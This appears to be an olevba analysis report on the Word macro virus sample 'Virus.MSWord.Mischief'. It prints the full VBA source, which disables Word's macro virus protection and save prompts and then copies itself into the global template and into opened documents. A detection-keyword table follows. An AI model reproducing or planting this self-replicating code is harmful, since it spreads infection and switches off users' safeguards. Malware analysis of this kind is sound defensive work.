olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mischief
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mischief - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Mischief - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Mischief - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit

Sub MAIN()
    On Error GoTo -1: On Error GoTo NoAutoOpen
    Dim i
    ' Do mischief!
    If Day(Now()) = 13 Then
        MsgBox "Hello, This is your friendly Word macro virus!", vbInformation
    End If
    '   Now copy the virus
    i = WordBasic.call("Friendly.Friendly", WordBasic.[FileName$]())
    
NoAutoOpen:
End Sub

-------------------------------------------------------------------------------
VBA MACRO Friendly.bas 
in file: Virus.MSWord.Mischief - OLE stream: 'Macros/VBA/Friendly'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit

Sub MAIN()
End Sub

Public Function Friendly(fileName_$)
On Error GoTo NoMacroCopy
Dim j

    ' Try to disable NORMAL.DOT write access warnings
    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
    
    ' Disable macro virus protection
    Options.VirusProtection = False
    
    ' Check if already infected
    j = WordBasic.CountMacros(0)
    If j <= 1 Then
        ' Copy to global
        WordBasic.MacroCopy fileName_$ + ":FileSave", "Global:FileSave", 1
        WordBasic.MacroCopy fileName_$ + ":AutoOpen", "Global:AutoOpen", 1
        WordBasic.MacroCopy fileName_$ + ":Friendly", "Global:Friendly", 1
    End If
    
    j = WordBasic.CountMacros(1)
    If j <= 1 Then
        ' Infect active file
        WordBasic.MacroCopy "Global:FileSave", fileName_$ + ":FileSave", 1
        WordBasic.MacroCopy "Global:AutoOpen", fileName_$ + ":AutoOpen", 1
        WordBasic.MacroCopy "Global:Friendly", fileName_$ + ":Friendly", 1
    End If
NoMacroCopy:
End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

